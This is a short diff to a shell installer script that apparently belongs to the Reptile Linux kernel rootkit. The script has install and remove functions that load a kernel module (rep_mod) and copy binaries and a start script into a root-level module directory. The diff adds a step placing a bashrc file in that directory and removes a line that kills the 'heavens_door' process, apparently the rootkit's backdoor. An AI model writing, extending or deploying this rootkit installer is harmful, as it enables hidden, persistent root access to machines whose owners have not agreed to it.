@@ -36,8 +36,6 @@ function directory_remove {
 	fi
 }
 
-
-
 function reptile_init {
 	banner
 
@@ -119,6 +117,7 @@ function reptile_install {
 	mkdir -p /$MODULE && \
 	cp bin/$MODULE* /$MODULE && \
 	cp scripts/start.sh /$MODULE/$MODULE"_start.sh" && \
+	cp scripts/bashrc /$MODULE/$MODULE"_rc" && \
 	rm -rf bin && \
 	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	echo -ne "Installing... "
@@ -165,7 +164,6 @@ function reptile_remove {
 		rmmod rep_mod || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	fi
 
-	kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'` && \
 	rm -rf /$MODULE && \
 	rm -rf $DRIVER_DIRECTORY && \
 	rm -rf /etc/rc.modules && \
